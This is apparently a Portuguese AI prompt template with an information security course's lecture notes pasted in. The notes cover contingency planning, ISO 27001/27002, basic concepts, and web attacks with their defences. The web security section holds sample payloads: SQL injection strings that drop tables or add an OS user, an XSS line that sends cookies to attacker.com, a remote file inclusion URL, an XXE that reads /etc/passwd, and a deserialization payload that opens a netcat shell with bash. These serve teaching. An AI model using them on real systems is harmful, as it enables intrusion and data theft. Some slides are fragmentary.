# Identidade e propósito

És um assistente de IA encarregado de responder perguntas sobre um curso de Segurança Informática. Você receberá conteúdo em markdown que contém informações sobre o curso, além de uma pergunta de um utilizador. O seu objetivo é responder à pergunta de forma precisa e concisa, com base apenas no conteúdo fornecido.

Primeiro, aqui está o conteúdo em markdown contendo informações sobre o curso:

```markdown
{{MARKDOWN_CONTENT}}
```

Use este conteúdo como a base da verdade para responder à pergunta. Não inclua informações de fontes externas ou do seu próprio conhecimento.

O utilizador fez a seguinte pergunta:

```markdown
# Segurança Informática
---
### 0. Apresentação
---
### Aula de Apresentação

## O Docente
* Licenciatura 5 anos Engenharia Informática
* Mestrado em Segurança Informática pela FCUL
* MSc Information Technology – Information Security pela Carnegie Mellon University
* Doutoramento em gestão de Sistemas de informação (ISEG)
* Certificações: CISSP, CISM, CISA, CEH, CPTS, IPMA-D

## Programa

* Introdução à Segurança Informática
* Conceitos fundamentais de Segurança Informática
* Paradigmas de Segurança
	+ Criptografia
	+ Algoritmos de segurança
	+ Autenticação e autorização
	+ Gestão de chaves
* Segurança de Redes
	+ Firewalls
	+ IDS/IPS
	+ Redes sem fios
	+ Arquitecturas de Segurança
	+ Protocolos de comunicação segura
	+ Tipificação de vulnerabilidades e ataques
* Segurança de Software
* Políticas e gestão de segurança

## Avaliação

Exame

## Sugestão Temas Trabalho Prático

* VoIP
* Gestão de Identidades
* Engenharia social
* Virtualização
* DDOS
* Smartphones
* Data Leak Prevention
* Redes Sociais
* Cloud Computing
* RFID
* Smartcards
* Forensics
* GSM
* Malware
* Botnets
* Honeypots
* Web 2.0

## Bibliografia

* Matt Bishop (2004), _Introduction to Computer Security_. Addison Wesley Professional.
* William Stallings (2003), _Network Security Essentials Applications and Standards_ , Prentice Hall, 2 Ed.
* William Stallings (2005), _Cryptography and Network Security Principles and Practices._ Prentice Hall, 4 Ed.
* C. P. Pfleeger, S. L. Pfleeger (2006), _Security in Computing,_ Prentice Hall, 4 Ed
* Bruce Schneier (1996), _Applied Cryptography_. John Wiley & Sons, 2 Ed.
* A. Zúquete (2006) Segurança em redes informáticas. FCA.

---
### 10. Contingência
---
## Planos de Contingência

### Introdução

- Planos de contingência preparam a organização para responder de forma eficiente a eventos inesperados.

- Desenvolvimento de planos de contingência:
  - Obter o suporte da gestão de topo
  - Organizar a equipa e processo de planeamento
    - Subdividir em vários tipos de planos se necessário
    - Conduzir a análise de impacto no negócio (BIA)
  - Documentar os planos
  - Testar os planos
  - Actualizar os planos periodicamente

  Fonte: Whitman

## Análise de impacto no negócio

- Análise de impacto no negócio (BIA):

  Investigação do impacto que vários incidentes têm no negócio.

- Plano de resposta a incidentes (IRP): Trata da identificação, classificação, resposta e recuperação de incidentes.
  
  Se o incidente for crítico, ativa o plano de recuperação de desastre.

- Plano de recuperação de desastre (DRP): Trata da preparação e recuperação do negócio em caso de desastre.

  Tenta recuperar o site principal afetado.

  Fonte: Whitman

- Plano de Continuidade de negócio (BCP):

  Assegura a continuidade das funções críticas em caso de incidentes críticos ou desastre.

  Assegurar os processos por via alternativa manual.
  Relocação dos processos, pessoas e tecnologias para um site alternativo.

Fonte: Whitman 6

- Metodologia genérica de planos de contingência:

  Fonte: Whitman

## Análise de impacto no negócio

- Levantamento e análise do impacto dos vários tipos de incidentes numa organização.
- Identifica cenários de ataque e o seu impacto.
- Quantifica a perda monetária em caso de paragem de serviço.
- Tem 5 fases:
  - Prioritização de ataques
  - Análise de unidades de negócio
  - Desenvolvimento de cenários de ataque
  - Análise de dano potencial
  - Classificação no plano subordinado

Fonte: Whitman 9

- Prioritização de ameaças:
  - Lista de ameaças e designar ataques.

Fonte: Whitman

- Análise de unidades de negócio:
  - Identificação de processos críticos
  - Prioritização de funções de negócio de acordo com processos.

Fonte: Whitman

- Desenvolvimento de cenários de ataque:
  - Avaliação do impacto de cada ataque em cada área e processo de negócio.
- Análise de dano potencial:
  - Estimativa de perda monetária com cada ataque
  - Estimativa de recuperação do serviço.
- Classificação no plano subordinado:
  - Integração dos resultados no plano de recuperação de desastres, continuidade de negócio e resposta a incidentes.

- **Maximum Tolerable Downtime (MTD)**: Tempo máximo que o dono do processo tolera que o processo esteja em baixo.
  - Visão do negócio
  - Também chamado Maximum Tolerable Period of Disruption (MTPD).

- **Recovery Time Objective (RTO)**: Tempo máximo de recuperação de um serviço antes que exista impacto nos processos/negócio.

- **Recovery Point Objective (RPO)**: Ponto no tempo até qual os dados devem ser recuperados para o serviço funcionar.

Fonte: Hill Associates

## Plano de resposta a incidentes

- Plano de resposta a incidentes: tem o foco na detecção e avaliação do nível de severidade dos incidentes.
  
  Deve conter ou resolver os incidentes.
  Se não conseguir resolver, deve ativar outro plano de contingência.

Fonte: Whitman

- Devem existir equipas especializadas na resposta a incidentes (CERT, CSIRT).

- Workflow do plano de resposta a incidentes:

Fonte: Whitman

- Estratégia de resposta a incidentes:
  - Estabelecer as políticas e procedimentos de resposta incidentes (classificação, triagem).
  - Preparar e treinar a equipa (honeypots).
  - Analisar a informação para caracterizar a intrusão.
  - Comunicação com as entidades envolvidas.
  - Recolha e proteção da evidência de intrusão.
  - Aplicação de ações de curto prazo para conter a intrusão (isolar sistema).
  - Analisar e eliminar acessos e rastos do atacante.
  - Recuperar sistemas.
  - Discutir lições aprendidas.

## Plano recuperação de desastres

- Pode ser um incidente que é escalado para desastre ou imediatamente classificado como desastre.
- Necessário mobilizar várias áreas de negócio.
- Desastres naturais (ex: terramoto) ou humanos (ex: terrorismo, cybercrime).
- Desastres de impacto total imediato ou aumentam com o tempo.
- Objetivos de um plano de recuperação de desastre:
  - Eliminar ou reduzir o potencial de feridos ou perda de vida humana, danos nos ativos da empresa, perdas financeiras.
  - Estabilizar o impacto de um desastre para iniciar o esforço de recuperação.
  - Implementar procedimentos definidos que possibilitem uma recuperação sustentada.
  
  O plano tem 5 fases: preparação, resposta, recuperação, retoma, restauração.

- Fase de Preparação:
  - Fase contínua que implica documentação e revisão do plano de recuperação de desastres.
  - Criação de cenários de desastre e avaliação de impacto (BIA).
  - Criação de plano de comunicação.
  - Testes ao plano de recuperação de desastres.

- Testes ao plano de recuperação de desastre:
  - Desk-check: revisão individual do plano em papel.
  - Walk-through: exercício em grupo para revisão do plano em papel.
  - Simulação: Individualmente cada pessoa/unidade simula o plano.
  - Teste paralelo: simular o desastre em grupo mas não interferir com as operações do dia a dia.
  - Teste completo: simulação completa com paragem de operações e recuperação das mesmas segundo o plano.

- Fase de resposta: reação atempada ao desastre que procura estabilizar a situação.
  - Proteger a vida humana.
  - Limitar os danos aos ativos da empresa.
  - Gerir a comunicação com os empregados, media e stakeholders.

- Fase de recuperação:
  - Início da recuperação dos serviços críticos ainda de modo degradado.
  - Serviços não críticos apenas na fase de retoma.
  - Objetivos:
    - Coordenar a recuperação.
    - Adquirir recursos para substituir materiais danificados.
    - Avaliar se é necessário ativar o plano de continuidade de negócio.

- Fase de restauração:
  - 2 Hipóteses: restaurar operações no site primário ou estabelecer operações num novo site.
  - Restaurar operações no site primário:
    - Reparar os danos no site primário.
    - Substituir o material no site primário.
    - Restabelecer operações no site primário.
  - Estabelecer operações num novo site:
    - Construção ou adaptação do novo site.
    - Planear a aquisição de equipamento para o novo site.
    - Coordenar a deslocação para o novo site.
    - Restabelecer operações no novo site.
  - No final, discutir as lições aprendidas e atualizar o plano de recuperação de desastres.

## Plano continuidade de negócio

- Assegura a Continuidade das operações (manuais ou utilizando um processo alternativo).
- Detalha os procedimentos e coordena a mudança para um site alternativo.
  
  O trigger normalmente é despoletado quando a equipa de recuperação de desastres avalia o impacto.
  Pode existir uma mudança parcial dependendo do dano no site primário.
  
  Existe uma equipa especializada para preparar o site secundário.
  Aquisição e configuração de novos equipamentos no site secundário
---
### 11.Websec
---
## Segurança Aplicações web

* O número de vulnerabilidades web não pára de aumentar
* Blind: error or time based

## Introdução
 Fonte: IBM X-force 2

* Percentagem de vulnerabilidades de software que são web
* Blind: error or time based

## Introdução
 Fonte: NIST 3

* SQL Injection: possibilidade de envio não autorizado de código SQL para ser interpretado pela DB do site destino e ser devolvido ou inferido o resultado

## SQL Injection
 Fonte: CMU 4

Código vulnerável:

## SQL Injection
 Fonte: CMU 5

Como explorar o código anterior:

* Colocar ‘ or 1=1 --
	+ Vai tornar a query sempre verdadeira
	+ ok = execute( SELECT ... WHERE user= ' ' or 1=1 --... )
* Colocar ‘ UNION ALL SELECT user, password FROM users; --
	+ Permite retirar outros dados em vez dos esperados
* Colocar ‘; DROP TABLE Users --
	+ Executa 2 queries (stacked queries)
	+ A segunda query apaga uma tabela
* Colocar ′ ; exec cmdshell ′netuser badguy badpwd′ /ADD --
	+ Execução de comandos no sistema operativo
	+ Adiciona um utilizador ao sistema operativo

## SQL Injection
 Fonte: CMU 7

* Error SQL Injection: Inferir informação do resultado da query SQL através de mensagens de erro retornadas pelo site

## SQL Injection
 8

* SQL injection de 2ª ordem (second order): 
	+ O ataque vai tomar partido de um query secundário que vai correr mais tarde na DB
	Exemplo:
	1. Criado o utilizador no registo do site: alice' or username='admin
	2. Quando um utilizador altera a password é corrida a query: update users set password='$password' where username='$username'
	3. Quando o utilizador alice vai alterar a password é corrida a query: update users set password='newpw' where username='alice' or username='admin'
	4. O atacante alterou também a password do admin

## SQL Injection
 8

* Blind SQL injection: Ataque utilizado quando o site não disponibiliza informação de erros ou redireciona para um erro genérico
* True/false: utiliza queries do tipo “id=1 and 1=1” ou “id=1 and 1=0” para inferir a execução com sucesso da query SQL
* Timed: utiliza funções de SQL que esperam um determinado tempo se a query for verdadeira
	+ Ex: Waitfordelay ou Sleep

## Protecção contra SQL Injection
 9

* Validação de Input:
	+ Validação de metacaracteres
	+ Verificação de tipo (ex: integer)
	+ Utilizar Whitelisting (dizer o que é permitido) em vez de Blacklisting (dizer o que é negado)
* Queries parametrizadas (Preparedstatements)
* Stored procedures parametrizadas
* Limitar a superfície de ataque:
	+ Reduzir privilégios da conta da DB (Ex: apenas leitura)
	+ Isolar DB (ligações outbound)
	+ Utilizar Web application firewall (WAF) ou Intrusion prevention system (IPS) Aplicacional

## Protecção contra SQL Injection
 10

* Prepared Statements

## Protecção contra SQL Injection
 Fonte: Schmatikov 11

* Stored procedures

## Protecção contra SQL Injection
 Fonte: CMU 12

* SQL Injection comic:

## XSS
Cross site scripting (XSS): um atacante injecta código malicioso (input) num site e esse código é interpretado no output na visualização do site por uma vítima

* 3 tipos:
	+ Reflected XSS: código é imediatamente reflectido assim que a vítima visita o site (não persistente)
	+ Stored XSS: o ataque é guardado no site e depois é activado posteriormente quando uma vítima visita o site (persistente)
	+ DOM XSS: toma partido da interpretação de variáveis locais do browser cliente (javascript) para injectar código malicioso

## XSS
Exemplo de detecção da vulnerabilidade:
colocar `<script>alert(123);</script>` nos vários campos disponíveis na aplicação

Exemplo de exploração:

`'><script>document.location='https://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Colocando este código num campo vulnerável irá roubar a cookie de um utilizador legítimo.

## XSS
 15

* Reflected XSS:

## XSS
 Fonte: Berkeley 16

* Stored XSS:

## XSS
 Fonte: Berkeley 17

* Document object module (DOM) XSS:
	+ OK: [http://vulsystem.com/welcome.html?name=Bob](http://vulsystem.com/welcome.html?name=Bob)
	+ XSS: [http://vulsystem.com/welcome.html?name=<script>a](http://vulsystem.com/welcome.html?name=<script>a) lert(document.cookie)</script>

## XSS
 18

```html
<HTML>
<TITLE>Welcome!</TITLE>
Hi
<SCRIPT>
var pos=document.URL.indexOf("name=")+5;
document.write(document.URL.substring(pos,document.URL.length));
</SCRIPT>
<BR>
Welcome to our system...
</HTML>
```
* Protecção XSS:
	+ Filtrar o Input:
		- Cookies, parameter, headers
		- Em PHP utilizar as funções: htmlentities( ), strip_tags( ), utf8_decode( ).
		- .Net usar Server.HtmlEncode(string) e validateRequest(IDS de XSS)
	+ Whitelisting em vez de Blacklisting
	+ Codificar o output:
		- `<` é alterado para `&lt;`
		- Codificação de caracteres (unicode, ISSO- 8859 - 1)
		- Existem bibliotecas que fazem isso: MS Anti-XSS, OWASP ESAPI

## CSRF
Cross site request forgery (CSRF): um site malicioso corre acções simulando o utilizador num site benigno

* O site benigno não valida novamente o utilizador, confiando no input do mesmo e executa as acções
* Ex: alterar configurações de contas, mudar password, retirar dinheiro, alterar configurações do router

## CSRF
 20

* Cross site request forgery (CSRF):

## CSRF
 Fonte: Schmatikov 21

* Exemplo CSRF Banco:
	+ Quando consulta o site do banco faz logoff ou signout?
	+ A cookie que sinaliza a sessão continua válida
	+ Se visita outros sites pode encontrar código malicioso que faz interacções com o site do banco
		- A cookie continua válida por isso é autorizado

## CSRF
 Fonte: Schmatikov 22

```
<form name=BillPayForm action=http://bank.com/BillPay.php>
<input name=recipient value=badguy> ...
<script> document.BillPayForm.submit(); </script>
```
* Exemplo CSRF Banco:

## CSRF
 Fonte: Schmatikov 23

* Protecção CSRF:
	+ Tokens de validação
		- Elaborar um token de validação random que contenha também o sessionID
	+ Validação de referer
		- Pode ser alterado ou apagado facilmente
	+ Header HTTP costumizado
		- Adicionar origin ao header (XMLHttpRequest, XDomainRequest)
	+ CAPCHA
	+ Forçar reautenticação para operações críticas

## HTTP Response splitting
HTTP Response splitting ou CRLF: Existem aplicações que colocam informação de input no HTTP header de resposta

* A maior parte delas não valida o que é escrito no HTTP response header, logo o atacante pode escrever input malicioso que é reflectido no header do browser da vítima similar ao XSS reflectido
	+ Com a inserção de 2 caracteres CR (carriage return, %0d ou \r) e LF (line feed, %0a ou \n) o atacante consegue escrever headers ou respostas HTTP adicionais

## HTTP Response splitting
 25

* Exemplo código:

* Pedido normal:
	http://www.the.site/welcome.asp?lang=Hebrew

* Resposta normal:

## HTTP Response splitting
 Fonte: OWASP 26

* Exemplo pedido ataque:
* Resposta de ataque:

## HTTP Response splitting
 Fonte: OWASP 27

* Exemplo ataque: a resposta 200 ok vai ser interpretada como a resposta ao redirect apresentando o código arbitrário do atacante no browser da vítima
	+ Este ataque pode também ser utilizado para envenenar a cache de um proxy (cache poisoning)
* Protecção: Validação de input
	+ Validação de metacaracteres

## Remote File Inclusion
Permite a inclusão de recursos remotos que podem conter código malicioso

* Código vulnerável:
$incfile = $_REQUEST["file"];
include($incfile.".php");
* Ataque:
	http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicious_page
* Protecção: Validação de input
	+ Validação de Path
	+ Whitelisting de ficheiros permitidos

## XML External Entities (XXE)
Permite a inclusão de recursos XML como entidades externas que podem conter código malicioso

* Ataque de exposição de informação:
```
<?xml version="1.0" encoding="ISO- 8859 - 1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```
* Ataque de DOS:
<!ENTITY xxe SYSTEM "file:///dev/random" >]>

## XML External Entities (XXE)
Protecção:

* Desactivar o XXE e processamento de DTD (Document Type Definition) nos parsers de XML da aplicação
* Whitelisting com validação de input
* Validar o XML com validação XSD (XML Schema Definition)
	+ Regras de validação do schema

## Ataque de deserialização
Serialização ou marshalling é utilizada para guardar objectos em formato standard para serem utilizados mais tarde

* Guardar em disco, enviar objectos na comunicação
* Um ataque de deserialização permite a alteração e injecção de código para ser executado quando os objectos são refeitos
* Prevenção:
	+ Validar dados vindos do utilizador utilizando filtros de deserialização

## Ataque de deserialização
Exemplo de exploração do System.Windows.Markup.XamlReader Parse

Fonte: Munoz

## Ataque de deserialização
Exemplo de exploração de DNNPersonalization Cookie no DotNetNuke:

Fonte: Munoz

## Ataque de deserialização
Exemplo de exploração de java.beans.XMLDecode:
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_102" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>

<void index="3">
<string>4444</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/bash</string>
</void>
</array>
</void>
</object>
</java>
```

## Componentes externos
A utilização de componentes externos é normal tendo a conta o principio da reutilização de código (libs, DLLs, excertos de código)

* No entanto alguns componentes têm vulnerabilidades que já foram reportadas ou serão reportadas posteriormente
	+ Apenas utilizar componentes externos de fontes confiáveis
	+ Documentar os componentes externos utilizados com a versão utilizada
	+ Verificar periodicamente a lista de bugs dos componentes externos

## Gestão erros
Não devem ser disponibilizadas mensagens de erro para os utilizadores que tenham informação de debug

* Atacante pode utilizar informação de erros para explorar ataques
	+ Error SQL Injection
	+ Descoberta Web Path no sistema operativo
* Controlar erros e redireccionar erros para uma página default controlada
	+ Código: try/catch
	+ Escrever erros em log
	+ Libertar recursos: previne DOS
* Desligar opções de debug em produção---
### 12.Standards
---



## Standards

### ISO 27001

* Norma que estabelece os requisitos mandatórios para um Sistema de Gestão de Segurança de Informação (SGSI) ou ISMS (Information security Management System)
* Existe a possibilidade de certificação do SGSI, certificando que estão implementados processos de segurança da informação

### ISO 27002

* Código de melhores práticas para Segurança da Informação (antiga ISO 17799)
* Lista de objetivos de controle e recomendações de implementação

DO ACT

* Establish the ISMS
* Maintain and improve the ISMS
* Monitor and review the ISMS
* Implement and operate the ISMS

PLAN

* Definição do âmbito
* Avaliação da postura de segurança estabelecendo uma baseline
* Processo de avaliação de risco
* Statement of Applicability
* Documentação

DO

* Executar o plano operacional
* Plano de tratamento de risco
* Identificar e alocar os recursos
* Escrever políticas e procedimentos
* Métricas
* Escrever e implementar um plano de continuidade de negócio
* Implementar controlos e formação
* Gerir a operação e recursos
* Implementação de um processo de gestão de incidentes de segurança
* Documentação

CHECK

* Avaliação de conformidade
* Revisão da efectividade do ISMS
* Revisão do nível de risco residual
* Realizar a auditoria interna
* Revisão regular pela gestão do ISMS
* Registar as acções e eventos que impactam o ISMS
* Documentação

ACT

* Implementar as melhorias identificadas
* Implementar acções correctivas e preventivas
* Aplicar lições aprendidas
* Comunicar os resultados
* Assegurar que o objectivo é atingido
* Continuar o processo de melhoria contínua
* Documentação

### Domínios da ISO 27001/27002

* Política de Segurança de Informação
* Organização de Segurança de Informação
* Segurança dos Recursos Humanos
* Gestão de Activos
* Controlo de Acessos
* Criptografia
* Segurança Física e Ambiental
* Segurança de Operações
* Segurança de Comunicações
* Aquisição, Desenvolvimento e Manutenção de Sistemas de Informação
* Relações com Fornecedores
* Gestão de Incidentes de Segurança de Informação
* Gestão da Continuidade de Negócio
* Conformidade (compliance)

### Políticas de Segurança da Informação

* Documentos que estabelecem a direcção da gestão de topo perante a Segurança da Informação
* Definição, aprovação pela gestão de topo e publicação e comunicação aos colaboradores e entidades externas relevantes
* Comprometimento da gestão de topo
* Revisões regulares ou em caso de alterações relevantes estratégicas

### Organização de Segurança da Informação

* Organização interna:
	+ Definição de papéis e responsabilidades
	+ Segregação de funções
	+ Estabelecer um canal de contacto com as autoridades
	+ Estabelecer um canal de contacto com grupos especializados na área
* Dispositivos móveis e trabalho remoto:
	+ Deve existir uma política que estabeleça medidas adicionais face aos riscos do uso de dispositivos móveis
	+ Deve existir uma política que estabeleça medidas para a protecção da informação trabalhada remotamente

### Segurança dos Recursos Humanos

* Antes da contratação:
	+ Análise prévia (screening) de candidatos de acordo com a informação sensível que vão aceder
	+ Formalização de responsabilidades de segurança de informação no contracto de trabalho
* Durante o vinculo laboral:
	+ A gestão obriga os colaboradores e prestadores de serviço a seguirem os requisitos de segurança definidos nas políticas
	+ Deve existir consciencialização (awareness), educação e treino aos colaboradores em matéria de segurança da informação
	+ Deve existir um processo disciplinar contra colaboradores que cometam uma violação da segurança da informação
* Saída ou mudança de funções do colaborador:
	+ Responsabilidades de segurança da informação que permaneçam válidas após saída ou mudança de funções do colaborador devem ser comunicadas

### Gestão de Activos

* Responsabilização pelos activos:
	+ Inventário de activos
	+ Definição de donos para os activos
	+ Definição de regras para o uso aceitável de activos e da informação neles residente
* Classificação de informação:
	+ Deve existir um processo de classificação de informação
	+ A informação deve ser classificada de acordo com os níveis de classificação de informação
	+ Devem existir procedimentos para o manejo de informação classificada

### Gestão de Activos

* Manuseamento de media:
	+ Devem existir procedimentos para o manejo de media removível de acordo com a classificação de informação
	+ Devem existir procedimentos formais para a alienação de media
	+ Media com informação deve ser protegida quando transportada

### Controlo de Acessos

* Requisitos de negócio no controlo de acessos:
	+ Deve existir uma política para controlo de acessos
	+ Os utilizadores só devem ter acesso a redes e serviços de rede autorizados
* Gestão de acessos de utilizadores:
	+ Deve existir um processo formal de registo e cancelamento de direitos de acesso
	+ Deve existir um processo formal de provisionamento para assignar direitos de acesso e métodos de autenticação
	+ Deve existir um controlo de acessos privilegiados (de administração)
	+ Deve existir um processo formal para controlo de alocação de informação secreta de autenticação (criação e comunicação de passwords)
	+ Revisão de acessos periódica
	+ Deve existir um cancelamento ou ajuste de acessos a colaboradores ou prestadores de serviços que saiam da empresa ou alterem funções

### Controlo de Acessos

* Responsabilidades dos utilizadores:
	+ Os utilizadores devem seguir as práticas definidas pela empresa em relação à informação secreta de autenticação (passwords)
* Controlo de acesso a sistemas e aplicações:
	+ Restrição de acesso a informação e funções nas aplicações de acordo com a política de controlo de acessos
	+ Deve existir um meio de login seguro em aplicações e sistemas
	+ Os sistemas de gestão de passwords devem ser interactivos e devem assegurar a qualidade das passwords
	+ Deve existir um controlo sobre os programas e funcionalidades que permitam ultrapassar ou sobrepor os controlos existentes
	+ Restrição de acesso ao código fonte

### Criptografia

* Deve existir uma política para controlos criptográficos
* Deve existir um controlo de protecção durante todo o ciclo de vida da gestão de chaves

### Segurança Física e Ambiental

* Áreas seguras:
	+ Perímetros de segurança para separar áreas com informação crítica
	+ Controlos de entrada para assegurar acesso apenas a pessoas autorizadas
	+ Segurança física para as instalações e escritórios
	+ Protecção de segurança física contra desastres naturais e ameaças humanas
	+ Procedimentos para trabalho em áreas seguras
	+ Separação e controlo de áreas de descarga

### Segurança Física e Ambiental

* Equipamentos:
	+ Equipamentos devem ser localizados e protegidos de forma a reduzir as ameaças
	+ Equipamentos devem ser protegidos contra falhas eléctricas e ambientais
	+ Cablagem deve ser resistente à interferência e intercepção
	+ Deve existir uma manutenção periódica
	+ Não deve ser possível de retirar equipamento das instalações sem autorização formal prévia
	+ Devem existir cuidados de segurança acrescidos para equipamentos fora das instalações
	+ Deve ser verificado que a informação não pode ser acedida e recuperada na alienação e reutilização de equipamento
	+ Equipamentos deixados temporariamente sem controlo humano devem ter a protecção adequada
	+ Deve existir uma política de secretária limpa (sem informação)

### Segurança de Operações

* Procedimentos e responsabilidades operacionais:
	+ Procedimentos de operação documentados e disponíveis
	+ Controlo de gestão de alterações que afecte a segurança da informação
	+ Gestão de capacidades
* Protecção contra malware:
	+ Devem existir controlos de detecção, prevenção e recuperação contra malware, bem como acções de awareness aos utilizadores

### Segurança de Operações

* Backup:
	+ Cópias de segurança testadas regularmente e de acordo com a política de backups
* Logging e monitorização:
	+ Registos (logs) de eventos de actividades, erros e segurança de informação devem ser guardados e analisados regularmente
	+ Informação de logs deve ser protegida contra alteração ou acesso não autorizado
	+ Actividades de administração devem ser alvo de registo, protecção e revisão regularmente
	+ Deve existir sincronização temporal de sistemas

### Segurança de Operações

* Controlo de software operacional:
	+ Deve existir procedimentos que controlem a instalação de software em sistemas operativos
* Gestão de vulnerabilidades técnicas:
	+ Informação sobre vulnerabilidades técnicas deve ser obtida em tempo útil e a exposição a essas vulnerabilidades avaliada do ponto de vista de risco e implementar medidas para correcção dessas vulnerabilidades
	+ Devem existir restrições à instalação de software por utilizadores
* Auditoria de sistemas de informação:
	+ Devem existir requisitos/objectivos, planeamento e execução de auditorias aos sistemas operacionais

### Segurança de Comunicações

* Gestão de segurança de rede:
	+ Redes devem ser geridas e controladas para salvaguardar a protecção da informação em aplicações e sistemas
	+ Mecanismos de segurança, níveis de serviço e requisitos de serviços de rede devem ser identificados e detalhados em acordo com o serviço
	+ Separação de redes
* Transferência de informação:
	+ Devem existir políticas e procedimentos formais que regulem a transferência de informação
	+ Devem existir acordos formais que regulem as transferências de informação dentro da organização e com os parceiros
	+ Informação em mensagens electrónicas deve ser protegida
	+ Devem existir contractos de confidencialidade e/ou não divulgação de informação, revistos regularmente

### Aquisição, Desenvolvimento e Manutenção de Sistemas

* Requisitos de segurança para sistemas de informação:
	+ Requisitos de segurança de informação devem ser incluídos nos requisitos e especificações de novos sistemas
	+ Devem ser protegidos serviços aplicacionais em redes públicas (Internet)
	+ Devem existir mecanismos de segurança para proteger transacções aplicacionais
* Segurança no desenvolvimento e suporte:
	+ Deve existir uma política que detalhe regras para o desenvolvimento de software de forma segura
	+ Alterações realizadas durante o ciclo de desenvolvimento de software devem ser controladas pelo uso formal de procedimentos de controlo de alterações.
	+ Quando existem alterações à plataforma operacional devem ser revistas as aplicações de forma a não causar impactos nas operações ou segurança
* Segurança no desenvolvimento e suporte:
	+ Devem ser controladas as alterações aos packages de software
	+ Devem ser identificados, documentados e aplicados os princípios de segurança de engenharia de sistemas
	+ Deve ser protegido o ambiente de desenvolvimento e deve ser aplicadas as boas práticas de integração no ciclo de desenvolvimento de software
	+ A organização deve supervisionar e monitorizar a actividade de desenvolvimento de software em outsourcing
* Segurança no desenvolvimento e suporte:
	+ Testes de segurança durante o desenvolvimento
	+ Devem existir testes de aceitação
* Dados de teste:
	+ Dados de teste devem ser protegidos e controlados

### Relações com Fornecedores

* Segurança da informação nas relações com fornecedores:
	+ Devem existir requisitos de segurança da informação documentados e acordados com fornecedores
	+ Os requisitos devem ser estabelecidos e acordados com fornecedores para o acesso, processamento, armazenamento, e comunicação de informação
	+ Devem existir acordos com fornecedores que incluam os riscos associados com as tecnologias de informação e comunicações
* Gestão de entrega de serviço de fornecedores:
	+ Deve existir controlo, monitorização e auditoria à Gestão de entrega de serviço de fornecedores
	+ Alterações à Gestão de entrega de serviço de fornecedores deve salvaguardar a actualização das políticas, controlos e procedimentos de segurança tendo em conta os riscos e a informação acedida

### Gestão de Incidentes de Segurança da Informação

* Devem existir procedimentos e responsabilidades definidas
* A comunicação de incidentes deve ser feita pelos canais definidos o mais rápido possível
* Colaboradores e prestadores de serviço devem comunicar falhas de segurança de informação
* Os eventos devem ser analisados e decidido se devem ser classificados como incidentes de segurança
* A resposta a incidentes deve ser feita de acordo com os procedimentos
* Conhecimento obtido na análise e resolução de incidentes deve ser utilizado na prevenção de incidentes futuros
* Devem existir procedimentos para a identificação, recolha, aquisição e preservação de evidências

### Gestão da Continuidade de Negócio

* Segurança de continuidade da informação:
	+ A organização deve identificar os requisitos para a segurança da informação e continuidade da gestão de segurança da informação em situações adversas
	+ Devem ser definidos, documentados e mantidos processos e controlos que assegurem a gestão de segurança da informação em situações adversas
	+ Revisão periódica dos controlos de continuidade de segurança da informação
* Redundâncias:
	+ Instalações de processamento de dados devem ser implementadas para garantir os requisitos de disponibilidade da informação

### Conformidade (compliance)

* Conformidade com requisitos contractuais e legais:
	+ Identificar, documentar e rever a legisla

---
### 1. Introducao
---
## Introdução e conceitos base

## Evolução Segurança
 Fonte:CISSPallinone 2

## Componentes base
### Confidencialidade, Integridade e Disponibilidade

* **Confidencialidade**: Garantia de que a **Informação** não é divulgada de forma inadequada a entidades ou processos não autorizados.
* **Integridade**: Garantia da prevenção contra a modificação e/ou destruição não autorizada da **Informação**.
* **Disponibilidade**: Garantia da acessibilidade da **Informação** onde e quando necessária e sem demora indevida.

## Componentes base
### Confidencialidade, Integridade e Disponibilidade

* **Confidencialidade**:
	+ Privacidade: confidencialidade dos dados pessoais.
	+ Anonimidade: confidencialidade da identidade
* **Integridade**:
	+ Autenticação: integridade da origem
	+ Responsabilização (Accountability): integridade da responsabilidade
	+ Autorização: integridade de direitos/permissões
	+ Não-repudiação: Integridade de comunicação
* **Disponibilidade**

## Componentes base
### McCumber Cube
```
Fonte: wikipedia
```

## Modelo AVI
### Ataque + Vulnerabilidade=Intrusão
* Hacker explora uma vulnerabilidade através de um ataque conseguindo uma intrusão
```
Fonte: LASIGE
```

## Relação entre conceitos
```
Fonte: CMU Quatar
```

### Modelo de ameaças
#### Ameaças

* Intercepção de informação (snooping/eavesdropping/sniffing)
* Reprodução de informação (disclosure/replay/fabrication)
* Modificação de informação (tampering)
* Personificação de outra entidade (spoofing/masquerading)
* Negação de serviço (DOS)
* Repudiação
* Acesso não autorizado

### Ameaças
#### Classificação de Ameaças

* **Passiva**: Ataque em que é exposta informação do sistema sem afetar os recursos
	+ Exemplo: Sniffing
* **Activa**: Ataque onde são afetados os recursos do sistema
	+ Exemplo: DOS, Replay

### Ameaças
 Fonte: Stallings 11

### Perfil do atacante
#### MOM (Motivo, Oportunidade e Meios)

* Motivo: lucro, status, divertimento, curiosidade, busca de conhecimento
* Oportunidade: valor da informação, ausência de limitações/barreiras físicas
* Meios: interno (com ligação ao alvo) ou externo

### Perfil do atacante
#### Tipos de Atacantes

* **Script Kiddies**: jovens com pouco conhecimento, guiados por curiosidade e fama
* **Donos de Botnets**: inicialmente ganharam poder com DDOS, agora apostam em ganhos financeiros
* **Grupo Online**: procuram vulnerabilidade desconhecidas, constroem as ferramentas de hacking para serem conhecidos
* **Hacker**: age sozinho, conhecimento através de auto estudo de falhas anteriores conhecidas
* **Intruso Contratado**: contratado por empresas para espiar a competição
* **Crime Organizado**: maximizar o lucro ilícito, roubar identidades para cometer fraude
* **Terroristas**: recrutam indivíduos com alto conhecimento, negação de serviço massivo
* **Serviços de Inteligência**: guerra da informação

### Perfil do atacante
#### Metodologia do atacante

* Recolha de informação
	+ Análise passiva
* Scanning
	+ Verificação activa de serviços e vulnerabilidades
* Intrusão
	+ Ataque através de exploits
* Manter o acesso
	+ Rootkits
* Apagar o rasto
	+ Alterar registos de monitorização

```
Fonte: CEH
```

